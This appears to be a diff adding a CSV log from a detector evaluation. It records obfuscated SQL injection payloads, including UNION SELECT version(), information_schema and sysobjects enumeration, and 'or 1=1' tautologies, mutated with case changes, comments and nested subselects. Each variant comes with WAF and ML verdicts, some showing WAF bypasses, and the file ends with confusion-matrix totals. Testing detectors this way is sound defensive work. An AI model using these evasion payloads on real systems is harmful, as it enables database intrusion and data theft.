+  (seLEcT (sEleCt  aNd 'ry'!='ryj'))  or  ""?  (  "" Or  ||  or (sElect (seLect 0x1)) not like (selEcT '%/n5' LiKe '%/n5')
+  lIKE   (sElEct (seLeCT 4652!=4653)<> And  AND 0x1) --/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:04:15.022603,403,403,both_correct," SeLEcT/**/* fROM users wHEre id   liKe
+  (SeLeCT (sELECt  aND	'ry'!='ryj'))  oR  ""?  (  "" oR  ||  Or (sELECT (seLECt 0x1)) not like (SELecT '%/n5' lIkE '%/n5')
+  LIkE   (SeLecT (SelECt (sELECt 9513 LIKE 9513)!=(selEcT 4653))<> aND  ANd 0x1) --/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:04:32.807648,403,403,both_correct," seleCt/**/* FRom users WheRe id   likE
+  (SelEcT (SEleCt  and	'ry'!='ryj'))  Or  ""?  (  "" Or   OR   Or (sElecT (SelEcT 0x1))
+not like (seLect '%/n5' lIKE '%/n5')
+  likE/**/  (SElECt (sELEcT (sElEcT  aNd (SELECT 1) LiKE ')' liKe ')')!=(sELeCt 4653))<> and  ANd 0x1) --/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:04:54.353545,403,403,both_correct," SELect * From users Where id   LIKe
+  (SEleCT (sElecT  aND	'ry'!='ryj'))  oR  ""?  (  "" OR   oR   oR (SelECT (SELECt 0x1))
+not like (select '%/n5' lIke '%/n5')
+  LikE/**/  (SelECT (SELEcT (SeLeCt  AnD (sELECT  OR 6210 LIKE 6210) LikE ')' lIKE ')')!=(SelEct 0x122d))!= aNd  And 0x1)	--/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:05:13.327351,403,403,both_correct
+22,2025-10-25T14:05:32.172792, select * from information_schema.tables--,403,403,200,waf_correct_ml_incorrect," seLeCT */* */FRoM
+information_schema.tables--",2025-10-25T14:05:49.962357,403,403,both_correct,"	SELECt * FrOm
+information_schema.tables--",2025-10-25T14:06:10.191807,403,200,waf_correct_ml_incorrect,"	SElECT/**/* From	information_schema.tables--",2025-10-25T14:06:29.258163,403,403,both_correct,"	SElect/**/*
+FRoM	information_schema.tables--",2025-10-25T14:06:48.031776,403,403,both_correct,"	SElECt *
+FROm information_schema.tables--",2025-10-25T14:07:06.786544,403,200,waf_correct_ml_incorrect,"	SeLECT/**/*
+frOm	information_schema.tables--",2025-10-25T14:07:24.079896,403,403,both_correct,"	SELECT/*Kqpat*/*/**/frOm	information_schema.tables--",2025-10-25T14:07:41.209330,403,403,both_correct,"	SElECt/*)Ld*/*
+frOM	information_schema.tables--",2025-10-25T14:07:58.619524,403,403,both_correct,"/*E}KD*/sEleCt/*)Ld*/*
+fRom	information_schema.tables--",2025-10-25T14:08:16.485141,403,403,both_correct,"/*[i;*/sELEcT/*)Ld*/* fRom	information_schema.tables--",2025-10-25T14:08:33.596414,403,403,both_correct
+23,2025-10-25T14:08:51.278659," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",403,403,200,waf_correct_ml_incorrect," sElECt * From users wHEre id   like   '7797<> AND 1' %!<@ union SeLEcT	0x1,version  (    ) /**/ -- 1'C",2025-10-25T14:09:07.203923,403,403,both_correct," seleCt * fROM users WhErE id   LIKE   '7797<> AND 9385 IN (9384,9385,9386)' %!<@ union sElect
+0x1,version  (    ) /**/ --/**/(SELECT (SELECT 1))'C",2025-10-25T14:09:26.336801,403,403,both_correct," SeleCt * FROM users WheRe id   LikE   '7797<> AND 9385 IN (9384, OR 'P}Z' NOT LIKE 'P}ZP',0x24aa)' %!<@ union Select 0x1,version  (    ) /**/ -- (SELECT (SELECT 1))'C",2025-10-25T14:09:44.498264,403,403,both_correct," seLect * from users whERe id   liKe   ''-' LIKE '-'<> AND (SELECT  AND 1) IN (9384, OR 'P}Z'
+NOT LIKE 'P}ZP',0x24aa)' %!<@ union SElECT 0x1,version  (    )   -- (SELECT (SELECT 1))'C",2025-10-25T14:10:01.905334,403,403,both_correct," SeleCt * FroM users wHerE id   liKE   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 1)) IN (9384, OR/*S*/'P}Z'
+NOT LIKE 'P}ZP',0x24aa)' %!<@ union SELEcT
+0x1,version  (    )   -- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'C",2025-10-25T14:10:19.410898,403,403,both_correct," seLECt * FroM users wherE id   LIke   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 3662 LIKE 3662, OR 'P}Z'
+NOT LIKE 'P}ZP',0x24aa)' %!<@ union sEleCt
+0x1,version  (    )  
+-- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'Cg",2025-10-25T14:10:37.597927,403,403,both_correct," SelecT * fROm users WhERe/*[7500!=7501*/id   LIkE   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND 1, OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union sELeCt
+0x1,version  (    )  
+-- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'Cg",2025-10-25T14:10:54.928569,403,403,both_correct," SElECt * fRom users wHErE id   liKE   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND 0x2a0=(SELECT 1), OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union SElECt 0x1,version  (    )  
+-- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'Cg",2025-10-25T14:11:12.441315,403,403,both_correct," select * FRom users WherE id   Like  /**/''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND 0x2a0=(SELECT 0x1), OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union SEleCt 0x1,version  (    )  
+--
+(SElECt (seLeCt (selEcT '&+>'!='&+>v')))'Cg",2025-10-25T14:11:30.322624,403,403,both_correct," SeLeCt * fRom users whERe id   LIKe   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND	0x2a0=(SELECT 0x1), OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union SeLecT 0x1,version  (    )  
+--
+(sELecT (SELECT (seLeCt '&+>'<>'&+>v')))'Cg",2025-10-25T14:11:49.546458,403,403,both_correct
+24,2025-10-25T14:12:08.293948," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",403,403,403,both_correct," SElEct * From users WhEre id  = /**/'P'!='PG' OR
+""%["" Or 0x1   lIkE    AND 1 -- 1",2025-10-25T14:12:26.183189,403,403,both_correct," sELECt * FROm users wheRe id  =  'P' NOT LIKE 'PG' oR	""%["" or 0x1   LIkE    AND 'o' NOT LIKE 'oq' -- (SELECT  OR 0)",2025-10-25T14:12:45.916982,403,403,both_correct," SElECt * froM users wHeRE id  =  'P' not like 'PG' or	""%["" Or 0x1   Like /**/  aND 'o' NOT LIKE 'oq' -- (SELECT	 OR (SELECT 2866 IN (2865, OR 0,2867)))",2025-10-25T14:13:04.470641,403,403,both_correct," SelEct	* frOm users WheRe id   LIKE   'P' not like 'PG' OR	""%["" oR 0x1   like    anD 'o' NOT LIKE 'oq' -- (SELECT	 OR (SELECT  AND 1 IN (2865, OR 0x0,3054<>3055)))]?",2025-10-25T14:13:23.158628,403,403,both_correct," selECT	* FroM users WHEre id   likE   'P' not like 'PG' OR	""%["" or 0x1   liKE    And 'o' not like 'oq' -- (SELECT	 OR (SELECT 	AND 0x1 IN ('k'/**/NOT LIKE 'kb', OR 0x0,3054<> AND 1)))]?",2025-10-25T14:13:42.330948,403,403,both_correct," seLEct	* From users WheRe id   LIke   'P' not like 'PG' oR	""%["" oR 0x1   likE    ANd 'o' not like 'oq' -- (SELECT		OR (SELECT 	AND 0x1 IN ('k'/*r{**/NOT LIKE/**/'kb', OR 0x0,1588 LIKE (SELECT 1588)<> AND  AND 1)))]?",2025-10-25T14:14:01.263557,403,403,both_correct," selECt	* fROm users wherE id   lIKe   'P' not like 'PG' ||	""%["" Or 0x1	  like    AnD 'o' not like 'oq' -- (SELECT		OR (SELECT 	AND 0x1 IN ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(SELECT 8974<>8975) LIKE (SELECT  AND 1)<> AND  AND 1)))]?wb",2025-10-25T14:14:20.071906,403,403,both_correct," sEleCt	* froM users wHERE id  /**/LiKE   'P' not like 'PG'  OR 	""%["" OR 0x1	  LIke    And 'o' not like 'oq' -- (SELECT		OR (SELECT 	AND	0x1 IN ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(SELECT 8974<> AND 1<>3835) LIKE (SELECT  AND 1)<> AND  AND (SELECT 1))))]?wbr",2025-10-25T14:14:38.491901,403,403,both_correct," sELECT	* froM users wherE id   likE   'P' not like 'PG'  || 	""%["" oR 0x1	  LiKE    aND 'o' not like 'oq' -- (SELECT	
+OR (SELECT 	AND	0x1 IN ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(SELECT 'P'<>'PJ'<> AND 1<>(SELECT  OR 0)) LIKE (SELECT  AND 1)<> AND  AND (SELECT 1))))]?wbr,",2025-10-25T14:14:57.766402,403,403,both_correct," seLEcT	* fROM users WHerE id   liKe   'P'/**/not like 'PG'  || 	""%["" or 0x1	  LIKE    And 'o' not like 'oq' -- (SELECT 
+Or (seLeCT 	anD	0x1 In ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(seLeCT 'P'<>'PJ'<> AND 0x1<>(seLeCt  oR  and 1)) lIke (SeleCt  And 'ff'!='ff%')<> aND  And (seleCt 1))))]?wbr,",2025-10-25T14:15:16.199259,403,403,both_correct
+25,2025-10-25T14:15:34.768387,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",403,403,403,both_correct," && 1 union/**/all seLECt 1,0x2,8868=8868,4,5,6,name fRom sysobjects
+WhERe xtype   =   'u' --",2025-10-25T14:15:52.946738,403,403,both_correct," && (SELECT 1) union all seLECt 1,0x2,8868=8997 not like  OR 0,4,5,6,name frOM sysobjects	wheRe xtype   =   'u' --",2025-10-25T14:16:12.944999,403,403,both_correct," && (SEleCT  && 1) union all SElecT 1,0x2,0x22a4=8997 not like  Or 0,2321=2321,5,6,name fROM sysobjects WHERE xtype  /*[4 */=   'u' --",2025-10-25T14:16:31.773980,403,403,both_correct," && (sELEct  && 1) union all
+SElEcT (SELECT 1),0x2,0x22a4=2607 NOT LIKE (SELECT 1) not like  or 0,2321=2321,5,6,name frOM sysobjects/**/wHeRe xtype  /*w`u*/ LIKE    'u' --",2025-10-25T14:16:50.654106,403,403,both_correct," && (sEleCt   AND   OR 0) union all
+sELect (sELEcT 1),0x2,0x22a4=2607 NOT LIKE (sELECt 1) not like  or 0,0x911='X'!='X?',5,6,name from
+sysobjects WHERE xtype  /*))F`*/ LiKe    'u' --",2025-10-25T14:17:11.471336,403,403,both_correct,"  AND  (SELEcT   AND/**/  OR 0) union all
+seLEct (SEleCt 1),0x2,0x22a4=2607 NOT LIKE (SELeCt 1) not like  or 0,0x911='X'!='X?',1039<>0x410,	OR 0,name fROm
+sysobjects where xtype  /*))F`*/ LikE    'u' --",2025-10-25T14:17:30.514067,403,403,both_correct,"  aND  (SELecT   and/* ivF7*/  oR/**/(SELECT ','=',')) union all
+sELECt (selECt 1),0x2,0x22a4=2607 not like (SeLeCt (SELECT 1)) not like  Or 0,0x911='X'!='X?',1039<>0x410,	or 0,name frOM
+sysobjects whERe xtype  /*))F`*/ like    'u' --",2025-10-25T14:17:49.394564,403,403,both_correct,"  aNd  (sELECT   And/* ivF7*/  or/**/(seLeCT ','=',')) union all
+SeLeCT (SelECT 1),0x2,0x22a4=2607 not like (SElect (SElECt (SElEcT 1))) not like  oR 'l' LiKE 'l',0x911 like 'X'!='X?',1039<>0x410,	oR  And 1,name from sysobjects whERE xtype  /*))F`*/ LIKE    'u'/**/--",2025-10-25T14:18:07.922300,403,403,both_correct,"/**/ and  (SeleCt   AND/* ivF7*/  Or/*#F[:*/(SeLECT ','=',')) union all
+seLeCt (SElEct 1),0x2,0x22a4 LIKE 2607 not like (sELEcT (seLeCT (SeLeCT  OR 0))) not like  or 'l' lIke 'l',0x911 LIke 'X'!='X?',1039<>0x410,	Or  And (SELECT ';c2=D' LIKE ';c2=D'),name From sysobjects wHeRE xtype  /*))F`*/	LiKE    'u'/**/--",2025-10-25T14:18:26.596193,403,403,both_correct,"/**/ aNd /**/(SeLEcT   and/* ivF7*/  OR/*#F[:*/(seleCT ','=',')) union all
+SeLeCt (sELECt 1),0x2,0x22a4 liKE  OR 0 not like (SElecT (select (SeleCT  Or '$k'<>'$k}')))	not like  OR 'l' LiKE 'l',0x911 LIKe 'X'!='X?',0x40f!=0x410,	OR  AND (selEcT ';c2=D' liKE ';c2=D'),name fRoM sysobjects where xtype  /*))F`*/	LiKe    'u'/**/--q",2025-10-25T14:18:44.857546,403,403,both_correct
+26,2025-10-25T14:19:03.232751," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",403,403,200,waf_correct_ml_incorrect," sELEcT * FRoM users WheRe id   LIKE    oR 0 union SELEct .(SeLECt 's!ET' NOT LIKE 's!ETG')$_,version  (  	 )/*:*/  -- 1",2025-10-25T14:19:21.274150,403,403,both_correct," SeLECt * fROm users WHerE id   lIke    OR (SELECT  AND 1) union sEleCT .(SElECT 's!ET'/**/not like 's!ETG')$_,version  (    )/*:*/  -- 296=296Jy",2025-10-25T14:19:40.673715,403,403,both_correct," sElecT * From/**/users WheRe id   lIKE    Or (SeLeCt  anD (select (SELECT 1))) union seLEct	.(sELeCT 's!ET'/*Rx5*/not like 's!ETG')$_,version  (    )/**/  -- 412 LIKE 412=296Jy",2025-10-25T14:19:59.246630,403,403,both_correct," SELecT * frOM/* AND 9862<>9863({*>*/users WhERe id   like    or (sElEct  ANd (selEcT (SELect 0x1))) union SelECt	.(SEleCt 's!ET'/*Rx5*/not like 's!ETG')$_,version  (
+   )   -- 412 LIKE 412=296Jy",2025-10-25T14:20:17.620193,403,403,both_correct," SelECt * FroM/* AND 0x2686<>9863({*>*/users WHERE id   lIKE    Or (selECT  aND (selEcT (sELect 0x1))) union SELeCT	.(sELECT 's!ET'/**/not like 's!ETG')$_,version  (    )   -- 412 LIKE/**/6041 LIKE  AND 1=296Jys",2025-10-25T14:20:36.341090,403,403,both_correct," sELEct * fRom/* AND 0x2686<>9863({*>*/users whERE id   lIke    or/**/(seLect  AnD (Select (SELect 0x1))) union seLEcT .(SElect 's!ET'/**/not like 's!ETG')$_,version  (    )   -- (SELECT 7132 LIKE 7132) LIKE/*/I*/6041 LIKE  AND (SELECT 1)=296Jys",2025-10-25T14:20:54.288632,403,403,both_correct," SELecT
+* fRom/* AND 0x2686<>9863({*>*/users wHERe id /**/ LiKE    ||/*0*/(seLECt  aND (sELeCT (seleCT 0x1))) union SElEcT .(seLECT 's!ET'/**/not like 's!ETG')$_,version  (    )   -- (SELECT 7132 LIKE 7132) LIKE/*/I*/8685 LIKE (SELECT 1) LIKE  AND (SELECT 0x1)=296Jys",2025-10-25T14:21:12.475995,403,403,both_correct," SeLecT
+* frOM/* AND 0x2686<>9863({*>*/users WhERE id /**/ lIKE	   ||/**/(SElECt  and (seLeCT (SElEcT 0x1))) union SELeCt .(seLECt 's!ET' not like 's!ETG')$_,version  (    )   -- (SELECT (SELECT 1) LIKE 0x1bdc) LIKE/*/I*/8685 LIKE (SELECT 1) LIKE  AND (SELECT 0x1)=296Jys'v",2025-10-25T14:21:30.930725,403,403,both_correct," sELect
+* FROM/* AND 0x2686<>9863({*>*/users whERE id /**/ LIke
+   ||/**/(sELEcT  AnD (sELEct (sELECt 0x1))) union seLeCt .(SELeCT 's!ET' not like 's!ETG')$_,version  (    )   -- (SELECT (SELECT 1) LIKE 0x1bdc)/**/LIKE/*/I*/ AND 1 LIKE 3030 LIKE (SELECT 0x1) LIKE  AND (SELECT 0x1)=296Jys'v;",2025-10-25T14:21:52.007260,403,403,both_correct," SEleCt
+* FROM/* AND 0x2686<> AND 1({*>*/users whEre id /**/ liKe
+   ||/**/(selecT  anD (SEleCt (SeleCT 0x1))) union sELEcT/**/.(SelecT 's!ET' not like 's!ETG')$_,version  (   
+)   -- (SELECT (SELECT '$5x'='$5x') LIKE 0x1bdc)/**/LIKE/*/I*/ AND 0x1 LIKE 3030 LIKE (SELECT 0x1) LIKE  AND (SELECT 0x1)=296Jys'v;Bz",2025-10-25T14:22:09.966276,403,403,both_correct
+27,2025-10-25T14:22:27.762772,select * from users where id  =  1 +$+ or 1  =  1 -- 1,403,403,403,both_correct,"sELEcT * fROm users WhErE id	  like   (seLECt  oR 0) +$+ oR 1 /**/=  ''*Q'!=''*Q\' -- 1d",2025-10-25T14:22:45.803639,403,403,both_correct,"SeLeCT * From users wHeRE id	  LIKE   (SeLeCt	 or  OR 0!=(SELECT 3834)) +$+ or/**/1 /**/=  ''*Q'!=''*Q\' -- 1dn",2025-10-25T14:23:04.803863,403,403,both_correct,"sELECt * FroM users WHerE id	  like   (seLect
+ or  Or  aNd 1!=(selEcT 0xefa)) +$+ Or/**/'N<^'='N<^'   LikE   ''*Q'!=''*Q\' -- 1dnl",2025-10-25T14:23:22.961683,403,403,both_correct,"SelEct * FroM users WHerE id   lIkE   (SELect
+ Or  or  ANd  Or 'W	[*' LIKE 'W	[*' not like (SeLeCT 0xefa)) +$+ oR/*%*/'N<^'='N<^'   lIke/**/  ''*Q'!=''*Q\' -- 1dnl",2025-10-25T14:23:41.986944,403,403,both_correct,"SelecT * from users wHERE id  /**/lIKE   (SELECT	 or  oR  And  or 'W	[*' lIkE 'W	[*' not like (sELecT 0xefa)) +$+ Or/**/'N<^' like 'N<^'   lIKe/**/  ''*Q'!=''*Q\' -- 1dnlZ(",2025-10-25T14:24:00.267139,403,403,both_correct,"SELECT * FROM users wHERe id 
+/**/LIke   (SelecT	 OR  OR  And  Or 'W	[*' Like 'W	[*' not like/**/(SeleCT 0xefa)) +$+ or/**/'N<^' liKE 'N<^'   Like/**/  ''*Q'!=''*Q\' -- 1dnlZ(",2025-10-25T14:24:18.651049,403,403,both_correct,"sELecT * from users whErE id 
+/**/like   (SElect	 Or  ||  AnD /**/oR 'W	[*' LiKe 'W	[*' not like/**/(SElEct 0xefa)) +$+ or/*(SELECT 0x1)>A9F*/'N<^' liKe 'N<^'   LiKE/**/  ''*Q'!=''*Q\' --	1dnlZ(",2025-10-25T14:24:36.605447,403,403,both_correct,"sElECt
+* frOm users/**/WheRe id 
+/**/like   (sELEcT	 oR  ||  aNd /**/oR 'W	[*' lIkE 'W	[*' not like/**/(selEct 0xefa)) +$+ OR/*(SELECT 0x1)>A9F*/'N<^' liKe 'N<^'   LikE/**/  ''*Q'!=''*Q\' --	1dnlZ(",2025-10-25T14:24:56.616222,403,403,both_correct,"SELecT
+* frOM users/**/WHERE id 
+/**/like   (SelEcT	 or  ||  And  OR 'W [*' LIKe 'W	[*' not like/**/(sElEct 0xefa)) +$+ Or/*(SELECT 0x1)>A9F*/'N<^' lIKE 'N<^'   liKe/**/  ''*Q'!=''*Q\' --	1dnlZ(",2025-10-25T14:25:14.623135,403,403,both_correct,"sELeCT
+* FROm users/**/whEre id 
+/**/LiKE   (sELect	 OR   or   aNd  OR 'W [*' LikE 'W	[*' not like/**/(sELECT 0xefa)) +$+ OR/*(SELECT 0x1)>A9F*/'N<^' LIkE 'N<^'   lIkE/**/  ''*Q'!=''*Q\'/**/--
+1dnlZ(",2025-10-25T14:25:32.420748,403,403,both_correct
+28,2025-10-25T14:25:50.484333,select * from users where id  =  1   or 1  =  1 -- 1,403,403,403,both_correct,"sElEcT *
+fROM users WHErE id   LIKE   0x1   or 1/**/ =   aND 'C' LIKE 'C' -- 1",2025-10-25T14:26:08.127534,403,403,both_correct,"SeLECT	*
+FrOM users WHERe id   liKE   0x1   or  AND ' '!=' Z'   LIKE    aNd 'C' Like 'C' -- 1S",2025-10-25T14:26:27.953396,403,403,both_correct,"SeLect *
+froM users WHERE id   lIKe   0x1   ||  AND ' '!=' Z'   likE   /*[*/AnD  OR 0<>0xd35 -- 1S",2025-10-25T14:26:46.982371,403,403,both_correct,"sElEct *	FrOm users wHerE id   LIKE   0x1   ||  And ' '!=' Z'   LikE    aND  oR  OR 0x0 like 5864<>0xd35 -- 1S+",2025-10-25T14:27:05.628630,403,403,both_correct,"sEleCt *	fROM users/*yg*/whEre id   LiKe   0x1	   or   and ' '!=' Z'   LikE    AnD  Or  or 0x0 LIKE  AND 'cL6'!='cL6g'<>0xd35 -- 1S+",2025-10-25T14:27:24.043255,403,403,both_correct,"seleCt *	FRom users/**/WHeRE id   LIke   0x1	   OR   AnD ' '!=' Z'  
+like    and  Or  or 0x0 lIke  anD 'cL6'!='cL6g'<>0xd35/*{*/-- 1S+",2025-10-25T14:27:41.956200,403,403,both_correct,"SeLEcT *
+frOm users/**/WHeRe id   LiKE   0x1	   oR   ANd ' '!=' Z'  
+likE /**/  AnD  oR  OR 0x0 Like  and 'cL6' not like 'cL6g'<>0xd35/*-_2*/-- 1S+",2025-10-25T14:28:00.625583,403,403,both_correct,"SELEct *
+FRom users/**/wherE id   LiKe   0x1
+   Or   And ' '!=' Z'  
+like    AnD  oR  OR 0x0 LiKE  aND 'cL6' not like 'cL6g'!=0xd35/*-_2*/-- 1S+Ta",2025-10-25T14:28:19.962487,403,403,both_correct,"seLect *
+frOM users wHerE id   liKE   0x1
+   OR   aND ' '!=' Z'  
+Like    anD  or	 or 0x0 like  aNd 'cL6' not like 'cL6g'!=0xd35/*-_2*/-- 1S+Tag",2025-10-25T14:28:38.935398,403,403,both_correct,"SElecT *
+FrOm users WHeRe id   lIKE   0x1
+   OR   AND ' ' not like ' Z'  
+liKE    ANd  oR  Or 0x0 LIKe  And 'cL6' not like/**/'cL6g'!=0xd35/**/-- 1S+Tagj",2025-10-25T14:28:57.161612,403,403,both_correct
+29,2025-10-25T14:29:15.667445,or 1  =  1--,403,200,200,both_incorrect,"or (SeLECt  OR/**/0) not like 7464  = 
+1--",2025-10-25T14:29:33.098833,200,403,waf_incorrect_ml_correct,"oR (sELect  oR/**/0x0) not like  oR/**/0  = 	2887!=2888--",2025-10-25T14:29:52.393962,200,403,waf_incorrect_ml_correct,"Or (selecT  oR/**/0x0) not like 	Or 'uP'<>'uP~'  = 	(seleCT 1) not like 0xb48--",2025-10-25T14:30:11.170974,200,403,waf_incorrect_ml_correct,"OR (SeLecT  Or 0x0) not like 	oR 'uP'<>'uP~'   like  	(seLecT	 anD (SeLECt 2221 LIKE 2221)) not like 0xb48--",2025-10-25T14:30:29.742543,200,403,waf_incorrect_ml_correct,"Or (SeLEcT  Or 0x0) not like 	oR 'uP' NOT LIKE 'uP~'   LIkE  	(sElECt	 aND (SElect 0x8ad liKE (SELECT 1)!=3328))/**/not like
+0xb48--",2025-10-25T14:30:48.105829,200,403,waf_incorrect_ml_correct,"OR (sElecT  Or 0x0) not like  oR 'uP' NOT LIKE 'uP~'   lIke  	(SeLeCT	 AND (sELECT 0x8ad lIKe/**/(seLecT  AND 'iK?'='iK?') NOT LIKE 0xd00))/**/not like
+0xb48--",2025-10-25T14:31:06.545900,200,403,waf_incorrect_ml_correct,"OR (sELeCT  OR 0x0) not like /**/Or 'uP' not like 'uP~'   LIke  	(SELEcT	 ANd (selEct 0x8ad LikE/**/(SElect  and 'iK?'='iK?') NOT LIKE 0xd00))/**/not like 0xb48--",2025-10-25T14:31:24.399515,200,403,waf_incorrect_ml_correct,"OR (SeLEct  or 0x0) not like /**/or 'uP' not like 'uP~'   lIKE  	(seleCt
+ aND (sEleCt 0x8ad liKE/*RDn*/(SelEct  anD 'iK?'='iK?') not like 0xd00)) not like 0xb48--",2025-10-25T14:31:43.102088,200,403,waf_incorrect_ml_correct,"or (seLEcT  or 0x0)/**/not like /**/Or 'uP' not like 'uP~'   lIKE  	(SElecT
+ AND (sELecT 0x8ad Like/*RDn*/(SelEct	 AnD 'iK?'='iK?') not like 0xd00)) not like 0xb48--",2025-10-25T14:32:01.944707,200,403,waf_incorrect_ml_correct,"oR (SElEcT  or 0x0)/**/not like /**/OR 'uP' not like 'uP~'   lIkE  	(sElect  anD (sELeCt 0x8ad LIKe (SelecT	 AnD 'iK?' LIkE 'iK?') not like 0xd00)) not like 0xb48--",2025-10-25T14:32:19.628225,200,403,waf_incorrect_ml_correct
+30,2025-10-25T14:32:37.939330," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",403,403,403,both_correct," seLEcT * FROM users wHeRE id /*c*/ likE   ''	OQ'!='	OQF'' union	SELect   (  \.  )  ,@@VERSION -- (SELECT  AND 1)'",2025-10-25T14:32:55.282469,403,403,both_correct," selecT	* From users WhEre id /*(i*/ lIKE   ''	OQ'!='	OQF'' union	seLeCt/**/  (  \.  )  ,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'",2025-10-25T14:33:14.099582,403,403,both_correct," sELEcT	* From users whEre id /*(i*/ Like   ''	OQ'!='	OQF'' union selEct   (  \.  )  ,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'",2025-10-25T14:33:32.762914,403,403,both_correct," SELeCT	* frOM users whErE id /*(i*/ lIKe  /**/''	OQ'!='	OQF'' union SeLeCT  	(  \.  )  ,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'.A",2025-10-25T14:33:51.149074,403,403,both_correct," SeLEct	* fROM users WHeRe id /*(i*/ LiKe  /**/''
+OQ'!='	OQF'' union seLeCt  	(  \.  )  ,@@VERSION -- (SELECT/**/ AND (SELECT  AND 'r	+'='r	+'))'.AQ",2025-10-25T14:34:09.605059,403,403,both_correct," SeleCt	* FroM users wheRE id /*(i*/ lIkE   ''	OQ'!='	OQF'' union sElECt  	(  \.  )  ,@@VERSION -- (SELECT/**/ AND (SELECT  AND 'r	+'='r	+'))'.AQL9",2025-10-25T14:34:27.346167,403,403,both_correct," SeLeCT	* from users WHERe id /*(i*/ LIkE   ''	OQ'!='	OQF'' union SElECT  	(  \.  ) 
+,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'.AQL9^",2025-10-25T14:34:46.154194,403,403,both_correct," SElEcT	* FrOm users Where id /*(i*/ lIkE   ''	OQ'!='	OQF'' union SELEcT  	(  \.  ) 	,@@VERSION -- (SELECT  AND (SELECT/**/ AND 'r	+'='r	+'))'.AQL9^Fd",2025-10-25T14:35:05.043451,403,403,both_correct," seLeCt	* FrOM users wheRE id /*(i*/ likE   ''	OQ'!='	OQF'' union SELECT  	(  \.  ) 	,@@VERSION --	(SELECT  AND (SELECT  AND 'r	+'='r	+'))'.AQL9^Fd",2025-10-25T14:35:22.827292,403,403,both_correct," seLEct	* fROm users WheRe id /*(i*/ liKe/*p!*/  ''	OQ'!='	OQF'' union SELect   (  \.  ) 	,@@VERSION --	(SELECT  AND (SELECT  AND 'r	+'='r	+'))'.AQL9^Fd",2025-10-25T14:35:40.712250,403,403,both_correct
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+Overall Results,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+WAF TP,289,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+WAF TN,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+WAF FP,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+WAF FN,41,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+ML TP,317,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+ML TN,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+ML FP,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+ML FN,13,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+Combined Results (2x2 Matrix),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,WAF Correct,WAF Incorrect,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+ML Correct,280,37,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+ML Incorrect,9,4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
